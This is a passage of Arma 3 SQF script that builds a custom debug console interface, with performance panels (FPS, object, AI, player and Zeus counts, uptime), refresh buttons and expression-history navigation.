            _PerfMetServerFPSButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetServerFPSButton ctrlSetTooltip ''REFRESH'';
            _PerfMetServerFPSButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updateServerFPS'', {}])];
            _PerfMetServerFPSButton ctrlCommit 0;

            EDC_PerfMetAvgFPS = _display ctrlCreate[''RscStructuredText'', 14020, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetServerFPS) select 0),
                ((ctrlPosition _WatchOutput1) select 1),
                ((ctrlPosition EDC_PerfMetServerFPS) select 2),
                ((ctrlPosition EDC_PerfMetServerFPS) select 3)
            ];
            EDC_PerfMetAvgFPS ctrlSetBackgroundColor[0.1, 0.05, 0.05, 0.8];
            EDC_PerfMetAvgFPS ctrlSetPosition _ctrlPos;
            EDC_PerfMetAvgFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Mean FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetAvgFPS ctrlCommit 0;

            with missionnamespace do {
                [] call EDC_fnc_updateAverageFPS;
            };

            _PerfMetAvgFPSButton = _display ctrlCreate[''RscButtonMenu'', 14021, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0) + ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            _PerfMetAvgFPSButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetAvgFPSButton ctrlSetPosition _ctrlPos;
            _PerfMetAvgFPSButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetAvgFPSButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetAvgFPSButton ctrlSetTooltipColorBox[1, 0, 0, 1];
            _PerfMetAvgFPSButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetAvgFPSButton ctrlSetTooltip ''REFRESH'';
            _PerfMetAvgFPSButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updateAverageFPS'', {}])];
            _PerfMetAvgFPSButton ctrlCommit 0;


            _PerfMetClientFPS = _display ctrlCreate[''RscStructuredText'', 14022, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchInput2) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            _PerfMetClientFPS ctrlSetBackgroundColor[0.05, 0.05, 0.1, 0.8];
            _PerfMetClientFPS ctrlSetPosition _ctrlPos;
            _PerfMetClientFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Client FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, floor diag_fps, 1.05 * EDC_textSize];
            _PerfMetClientFPS ctrlCommit 0;

            _PerfMetClientFPS spawn {
                while {
                    !isNull _this
                }
                do {
                    with uinamespace do {
                        _this ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Client FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, floor diag_fps, 1.05 * EDC_textSize];
                        _this ctrlCommit 0;
                    };
                    uiSleep 0.1;
                };
            };

            _PerfMetClientFPSButton = _display ctrlCreate[''RscButtonMenu'', 14023, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _PerfMetClientFPS) select 0) + ((ctrlPosition _PerfMetClientFPS) select 2),
                ((ctrlPosition _PerfMetClientFPS) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition _PerfMetClientFPS) select 3)
            ];
            _PerfMetClientFPSButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetClientFPSButton ctrlSetPosition _ctrlPos;
            _PerfMetClientFPSButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetClientFPSButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetClientFPSButton ctrlSetTooltipColorBox[0, 0, 1, 1];
            _PerfMetClientFPSButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetClientFPSButton ctrlSetTooltip ''REFRESH'';
            _PerfMetClientFPSButton ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14024, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetClientFPSButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[0, 0, 1, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlCommit 0;


            _Frame = _display ctrlCreate[''RscFrame'', 14025, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetAvgFPSButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[1, 0, 0, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14026, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetServerFPSButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[0, 1, 0, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlCommit 0;

            EDC_PerfMetObjCount = _display ctrlCreate[''RscStructuredText'', 14027, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchOutput2) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            EDC_PerfMetObjCount ctrlSetBackgroundColor[0.05, 0.05, 0.05, 0.8];
            EDC_PerfMetObjCount ctrlSetPosition _ctrlPos;
            EDC_PerfMetObjCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Object Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetObjCount ctrlCommit 0;

            with missionnamespace do {
                call EDC_fnc_updateObjCount
            };

            _PerfMetObjCountButton = _display ctrlCreate[''RscButtonMenu'', 14028, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetObjCount) select 0) + ((ctrlPosition EDC_PerfMetObjCount) select 2),
                ((ctrlPosition EDC_PerfMetObjCount) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetObjCount) select 3)
            ];
            _PerfMetObjCountButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetObjCountButton ctrlSetPosition _ctrlPos;
            _PerfMetObjCountButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetObjCountButton ctrlSetTooltip ''REFRESH'';
            _PerfMetObjCountButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetObjCountButton ctrlSetTooltipColorBox[1, 1, 1, 1];
            _PerfMetObjCountButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetObjCountButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updateObjCount'', {}])];
            _PerfMetObjCountButton ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14029, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetObjCountButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlCommit 0;








            EDC_PerfMetAICount = _display ctrlCreate[''RscStructuredText'', 14030, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchInput3) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            EDC_PerfMetAICount ctrlSetBackgroundColor[0.05, 0.1, 0.1, 0.8];
            EDC_PerfMetAICount ctrlSetPosition _ctrlPos;
            EDC_PerfMetAICount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  AI Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetAICount ctrlCommit 0;

            with missionnamespace do {
                call EDC_fnc_updateAICount
            };

            _PerfMetAICountButton = _display ctrlCreate[''RscButtonMenu'', 14031, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAICount) select 0) + ((ctrlPosition EDC_PerfMetAICount) select 2),
                ((ctrlPosition EDC_PerfMetAICount) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetAICount) select 3)
            ];
            _PerfMetAICountButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetAICountButton ctrlSetPosition _ctrlPos;
            _PerfMetAICountButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetAICountButton ctrlSetTooltip ''REFRESH'';
            _PerfMetAICountButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetAICountButton ctrlSetTooltipColorBox[0, 1, 1, 1];
            _PerfMetAICountButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetAICountButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updateAICount'', {}])];
            _PerfMetAICountButton ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14032, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetAICountButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[0, 1, 1, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlCommit 0;




            EDC_PerfMetPlayerCount = _display ctrlCreate[''RscStructuredText'', 14033, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchOutput3) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            EDC_PerfMetPlayerCount ctrlSetBackgroundColor[0.1, 0.1, 0.05, 0.8];
            EDC_PerfMetPlayerCount ctrlSetPosition _ctrlPos;
            EDC_PerfMetPlayerCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  AI Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetPlayerCount ctrlCommit 0;

            with missionnamespace do {
                call EDC_fnc_updatePlayerCount
            };

            _PerfMetPlayerCountButton = _display ctrlCreate[''RscButtonMenu'', 14034, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetPlayerCount) select 0) + ((ctrlPosition EDC_PerfMetPlayerCount) select 2),
                ((ctrlPosition EDC_PerfMetPlayerCount) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetPlayerCount) select 3)
            ];
            _PerfMetPlayerCountButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetPlayerCountButton ctrlSetPosition _ctrlPos;
            _PerfMetPlayerCountButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetPlayerCountButton ctrlSetTooltip ''REFRESH'';
            _PerfMetPlayerCountButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetPlayerCountButton ctrlSetTooltipColorBox[1, 1, 0, 1];
            _PerfMetPlayerCountButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetPlayerCountButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updatePlayerCount'', {}])];
            _PerfMetPlayerCountButton ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14035, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetPlayerCountButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[1, 1, 0, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlCommit 0;



            EDC_PerfMetZeusCount = _display ctrlCreate[''RscStructuredText'', 14036, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchInput4) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            EDC_PerfMetZeusCount ctrlSetBackgroundColor[0.1, 0.05, 0.1, 0.8];
            EDC_PerfMetZeusCount ctrlSetPosition _ctrlPos;
            EDC_PerfMetZeusCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  AI Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetZeusCount ctrlCommit 0;

            with missionnamespace do {
                call EDC_fnc_updateZeusCount
            };

            _PerfMetZeusCountButton = _display ctrlCreate[''RscButtonMenu'', 14037, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetZeusCount) select 0) + ((ctrlPosition EDC_PerfMetZeusCount) select 2),
                ((ctrlPosition EDC_PerfMetZeusCount) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetZeusCount) select 3)
            ];
            _PerfMetZeusCountButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetZeusCountButton ctrlSetPosition _ctrlPos;
            _PerfMetZeusCountButton ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaSemiBold'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\cfgwaypoints\cycle_ca.paa''></img><t/>", 0.95 * EDC_textSize];
            _PerfMetZeusCountButton ctrlSetTooltip ''REFRESH'';
            _PerfMetZeusCountButton ctrlSetTooltipColorText[1, 1, 1, 1];
            _PerfMetZeusCountButton ctrlSetTooltipColorBox[1, 0, 1, 1];
            _PerfMetZeusCountButton ctrlSetTooltipColorShade[0, 0, 0, 1];
            _PerfMetZeusCountButton ctrlAddEventHandler["ButtonClick", (missionnamespace getVariable[''EDC_fnc_updateZeusCount'', {}])];
            _PerfMetZeusCountButton ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14038, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetZeusCountButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlSetTooltip ''REFRESH'';
            _Frame ctrlSetTooltipColorText[1, 1, 1, 1];
            _Frame ctrlSetTooltipColorBox[1, 0, 1, 1];
            _Frame ctrlSetTooltipColorShade[0, 0, 0, 1];
            _Frame ctrlCommit 0;


            EDC_PerfMetServerUptime = _display ctrlCreate[''RscStructuredText'', 14039, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetAvgFPS) select 0),
                ((ctrlPosition _WatchOutput4) select 1),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 2),
                ((ctrlPosition EDC_PerfMetAvgFPS) select 3)
            ];
            EDC_PerfMetServerUptime ctrlSetBackgroundColor[0.05, 0.05, 0.05, 0.8];
            EDC_PerfMetServerUptime ctrlSetPosition _ctrlPos;
            EDC_PerfMetServerUptime ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Server Uptime<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetServerUptime ctrlCommit 0;

            EDC_PerfMetServerUptime spawn {
                while {
                    !isNull _this
                }
                do {
                    with uinamespace do {
                        _this ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Server Uptime<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, [time / 3600] call bis_fnc_timetostring, 1.05 * EDC_textSize];
                        _this ctrlCommit 0;
                    };
                    uiSleep 1;
                };
            };

            _PerfMetServerUptimeButton = _display ctrlCreate[''RscStructuredText'', 14040, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition EDC_PerfMetServerUptime) select 0) + ((ctrlPosition EDC_PerfMetServerUptime) select 2),
                ((ctrlPosition EDC_PerfMetServerUptime) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.001,
                ((ctrlPosition EDC_PerfMetServerUptime) select 3)
            ];
            _PerfMetServerUptimeButton ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _PerfMetServerUptimeButton ctrlSetPosition _ctrlPos;
            _PerfMetServerUptimeButton ctrlCommit 0;

            _PerfMetServerUptimeIcon = _display ctrlCreate[''RscStructuredText'', 14042, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _PerfMetServerUptimeButton) select 0),
                ((ctrlPosition _PerfMetServerUptimeButton) select 1) + 0.003,
                ((ctrlPosition _PerfMetServerUptimeButton) select 2) + 0.05,
                ((ctrlPosition _PerfMetServerUptimeButton) select 3)
            ];
            _PerfMetServerUptimeIcon ctrlSetBackgroundColor[0.1, 0.1, 0.1, 0];
            _PerfMetServerUptimeIcon ctrlSetPosition _ctrlPos;
            _PerfMetServerUptimeIcon ctrlSetStructuredText parseText format["<t shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\igui\cfg\actions\settimer_ca.paa''></img><t/>", 0.895 * EDC_textSize];
            _PerfMetServerUptimeIcon ctrlCommit 0;

            _Frame = _display ctrlCreate[''RscFrame'', 14041, _ctrlGroupParent];
            _ctrlPos = ctrlPosition _PerfMetServerUptimeButton;
            _Frame ctrlSetTextColor[1, 1, 1, 0.1];
            _Frame ctrlSetPosition _ctrlPos;
            _Frame ctrlCommit 0;



            _display displayRemoveAllEventHandlers ''KeyDown'';

            comment "//--- block expression enter when over watchfield";
            _display displayAddEventHandler["KeyDown", {
                EDC_DIK_RETURN = 28;
                EDC_DIK_NUMPADENTER = 156;
                if (_this select 1 in [EDC_DIK_RETURN, EDC_DIK_NUMPADENTER]) then {
                    _parentDisplay = _this select 0;
                    if ({
                            _x getVariable["RscDebugConsole_watchPaused", false]
                        }
                        count(uinamespace getVariable[''EDC_ctrls_watchInputs'', []]) > 0) then {
                        with uinamespace do {
                            if (!isNil ''EDC_expression'') then {
                                if (!isNull EDC_expression) then {
                                    ctrlSetFocus EDC_expression;
                                };
                            };
                        };
                        true
                    };
                };
            }];

            comment "//--- cycle through previous expressions";

            if (false) then {
                _display displayAddEventHandler["KeyDown", {
                    params["_parentDisplay", "_key"];

                    EDC_DIK_NEXT = 209;
                    comment "PG DN";
                    EDC_DIK_PRIOR = 201;
                    comment "PG UP";

                    if (_key in [EDC_DIK_PRIOR, EDC_DIK_NEXT]) then {
                        _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                        _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";

                        _last = count _expressionHistory - 1;

                        _index = 0 max((_parentDisplay getVariable "RscDebugConsole_expressionHistory_index") + ([1, -1] select(_key == EDC_DIK_NEXT))) min _last;
                        _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", _index];

                        _expressionCtrl = uinamespace getVariable ''EDC_expression'';
                        _expressionCtrl ctrlSetText(_expressionHistory select _index);

                        if (ctrlEnabled _expressionCtrl) then {
                            comment "// --- Save last result";

                            _lastResult = ctrlText(uinamespace getVariable ''EDC_expressionOutput'');
                            _expressionResultHistory set[0, _lastResult];
                            if (_lastResult isEqualTo "") then {
                                _expressionResultHistory set[1, [0, 0, 0, 0]]
                            };
                        };

                        if (_index < _last) then {
                            _expressionCtrl ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText "";

                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor[0, 0, 0, 0];
                            _parentDisplay getVariable "RscDebugConsole_state"
                            params["_stateServer", "_stateGlobal", "_stateLocal"];

                            _stateServer select 0 ctrlSetText "";
                            _stateGlobal select 0 ctrlSetText "";

                            if (isMultiplayer) then {
                                _stateServer select 0 ctrlenable false;
                                _stateGlobal select 0 ctrlenable false;
                            };

                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlSetText "";

                            _stateLocal select 0 ctrlSetText format["%1 %2", "SELECT", (count _expressionHistory) - 1 - _index];
                            ctrlSetFocus(_stateLocal select 0);
                        }
                        else {
                            _expressionCtrl ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText(_expressionResultHistory select 0);
                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor(_expressionResultHistory select 1);

                            {
                                _x select 0 ctrlSetText(_x select 1);
                                if (isMultiplayer) then {
                                    _x select 0 ctrlEnable true
                                };
                            }
                            forEach(_parentDisplay getVariable "RscDebugConsole_state");

                            with uinamespace do {
                                EDC_ButtonExecuteServer ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\statusbar\server_ca.paa''></img> SERVER EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteAll ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_global_ca.paa''></img> GLOBAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteLocal ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_local_ca.paa''></img> LOCAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteTarget ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img> TARGET EXEC<t font=''EtelkaMonospacePro''>:<t/>", 1.05 * EDC_textSize];

                                EDC_ButtonExecuteServer ctrlCommit 0;
                                EDC_ButtonExecuteAll ctrlCommit 0;
                                EDC_ButtonExecuteLocal ctrlCommit 0;
                                EDC_ButtonExecuteTarget ctrlCommit 0;

                                EDC_ButtonExecuteTarget ctrlEnable true;
                            };

                            ctrlSetFocus _expressionCtrl;
                        };

                        true
                    };
                }];
            };

            _ButtonPreviousExpression = _display ctrlCreate[''RscButtonMenu'', 14043, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ExpressionOutput) select 0),
                ((ctrlPosition _ExpressionOutput) select 1),
                ((ctrlPosition _ButtonWatch1) select 2) - 0.005,
                ((ctrlPosition _ButtonWatch1) select 3)
            ];
            _ButtonPreviousExpression ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonPreviousExpression ctrlSetPosition _ctrlPos;
            _ButtonPreviousExpression ctrlSetStructuredText parseText format["<t font=''puristaSemiBold'' align=''center'' shadow=''0'' color=''#FFFFFF'' size=''%1''>ª<t/>", 0.93 * EDC_textSize];
            _ButtonPreviousExpression ctrlSetTooltip ''PREVIOUS STATEMENT'';
            _ButtonPreviousExpression ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                _parentDisplay = ctrlParent _control;
                _key = 209;
                EDC_DIK_NEXT = 209;
                comment "PG DN";
                EDC_DIK_PRIOR = 201;
                comment "PG UP";

                if (_key in [EDC_DIK_PRIOR, EDC_DIK_NEXT]) then {
                    _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                    _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";

                    _last = count _expressionHistory - 1;

                    _index = 0 max((_parentDisplay getVariable "RscDebugConsole_expressionHistory_index") + ([1, -1] select(_key == EDC_DIK_NEXT))) min _last;
                    _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", _index];

                    _expressionCtrl = uinamespace getVariable ''EDC_expression'';
                    _expressionCtrl ctrlSetText(_expressionHistory select _index);

                    if (ctrlEnabled _expressionCtrl) then {
                        comment "// --- Save last result";

                        _lastResult = ctrlText(uinamespace getVariable ''EDC_expressionOutput'');
                        _expressionResultHistory set[0, _lastResult];
                        if (_lastResult isEqualTo "") then {
                            _expressionResultHistory set[1, [0, 0, 0, 0]]
                        };
                    };

                    if (false) then {
                        if (_index < _last) then {
                            _expressionCtrl ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText "";

                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor[0, 0, 0, 0];
                            _parentDisplay getVariable "RscDebugConsole_state"
                            params["_stateServer", "_stateGlobal", "_stateLocal"];

                            _stateServer select 0 ctrlSetText "";
                            _stateGlobal select 0 ctrlSetText "";

                            if (isMultiplayer) then {
                                _stateServer select 0 ctrlenable false;
                                _stateGlobal select 0 ctrlenable false;
                            };

                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlSetText "";

                            _stateLocal select 0 ctrlSetText format["%1 %2", "SELECT", (count _expressionHistory) - 1 - _index];
                            ctrlSetFocus(_stateLocal select 0);
                        }
                        else {
                            _expressionCtrl ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText(_expressionResultHistory select 0);
                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor(_expressionResultHistory select 1);

                            {
                                _x select 0 ctrlSetText(_x select 1);
                                if (isMultiplayer) then {
                                    _x select 0 ctrlEnable true
                                };
                            }
                            forEach(_parentDisplay getVariable "RscDebugConsole_state");

                            with uinamespace do {
